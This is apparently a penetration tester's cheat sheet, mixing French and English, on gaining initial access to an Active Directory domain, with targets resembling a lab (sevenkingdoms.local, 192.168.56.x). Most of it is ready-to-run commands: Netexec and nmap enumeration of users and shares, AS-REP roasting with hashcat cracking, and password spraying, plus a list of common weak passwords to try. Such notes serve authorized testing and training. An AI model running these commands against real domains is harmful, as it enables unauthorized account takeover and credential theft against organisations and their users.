# Initial access

> L'objectif est d'obtenir un premier compte ou un premier accès sur une machine

## Scan de protocoles

Commencer par faire un scan avec les différents protocoles supportés par Netexec (Netexec donne certaines informations pour certains protocoles comme par exemple le NLA sur RDP)

```bash
nxc rdp ip.txt
```

## Enumerate DC’s anonymously

```bash
nxc smb ip.txt --users
nxc smb ip.txt -u 'a' -p '' --users
```

## Testing if an account exists (Kerberos)

### Nmap

```bash
sudo nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=possible_usernames.txt" 192.168.56.10
```

### Netexec

```bash
nxc ldap ip.txt -u possible_usernames.txt -p '' -k
```

## List guest access on shares

```bash
nxc smb ip.txt --shares
nxc smb ip.txt -u 'a' -p '' --shares
```

## User but no credentials

### AS-REP roasting

Attaque sur les étapes KRB\_AS\_REQ et KRB\_AS\_REP du protocole Kerberos\
Si un utilisateur possède l’attribut DONT\_REQ\_PREAUTH dans l’UAC\
Alors l’envoi du timestamp lors de KRB\_AS\_REQ n’est pas nécessaire\
N’importe qui peut forger une demande KRB\_AS\_REQ pour un utilisateur arbitraire

#### Extraction

```bash
nxc ldap 192.168.56.11 -u north_users.txt -p '' --asreproast asreproast.txt
```

#### Cracker les hashs hors-ligne

```bash
hashcat -m18200 asreproast.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

> When you get an account on an active directory, the first thing to do is always getting the full list of users.\
> Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).

Vérifier la politique de mot de passe

```bash
nxc smb 192.168.56.11 --pass-pol
nxc smb 192.168.56.11 -u '' -p '' --pass-pol
```

Username = Password

```bash
nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Tester des mots de passes simples

```bash
nxc smb 192.168.56.11 -u users.txt -p 'Azerty123!'
```

Tenter des listes de mot de passe simples

```bash
nxc smb 192.168.56.11 -u users.txt -p passwords.txt
```

Parmi les types de mots de passe les plus communs (à adapter selon la password policy):

* Password=Username (souvent des comptes de service)
* Mot de passe par défaut utilisé par l'IT
* NomEntreprise2024!
* NomEntreprise75001
* Janvier2024
* Mardi15042025!!!
* Azerty123!
* Password123!
* Bonjour123\*
* 123456
